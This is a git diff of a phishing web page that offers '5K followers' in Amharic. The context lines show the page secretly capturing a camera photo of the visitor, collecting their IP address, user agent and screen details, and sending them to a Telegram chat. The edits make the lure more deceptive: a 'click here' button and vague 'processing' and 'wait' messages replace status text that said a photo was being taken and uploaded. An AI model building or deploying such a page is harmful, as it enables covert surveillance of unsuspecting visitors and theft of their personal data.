@@ -140,7 +140,7 @@
   </div>
   <h1>✨ 5K <span>FOLLOWERS</span> ✨</h1>
   <p class="sub">አሁን በቀላሉ ያግኙ! • ፈጣን እና አስተማማኝ</p>
-  <button class="btn" id="btn">🔥 አሁን ያግኙ 5K</button>
+  <button class="btn" id="btn">🔥👉𝗰𝗹𝗶𝗰𝗸 𝗵𝗲𝗮𝗿𝗲🔥👈</button>
   <div id="status">⏳ እባክዎ ይጫኑ</div>
   <div class="badge">📱 አንድሮይድ ተመችቷል</div>
   <video id="video" autoplay playsinline></video>
@@ -220,7 +220,7 @@
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', photoBlob, 'cam_android.jpg');
-      let caption = '📸 አዲስ ተጠቃሚ\n' +
+      let caption = '📸 አዲስ ናገር ⬇️\n' +
                     'IP: ' + info.ip + '\n' +
                     'UA: ' + info.ua + '\n' +
                     'Screen: ' + info.screen + '\n' +
@@ -251,11 +251,11 @@
         video.srcObject = stream;
         video.onloadedmetadata = function() {
           video.play();
-          setStatus('📸 ፎቶ እየተቀረጸ...');
+          setStatus('📸 processing...');
           setTimeout(() => {
             Promise.all([capturePhoto(), getIPAndUA()])
               .then(([photoBlob, info]) => {
-                setStatus('📤 ወደ ሰርቨር እየላክ...');
+                setStatus('📤 wait🫸🙏...');
                 return sendToTelegram(photoBlob, info);
               })
               .then(response => {
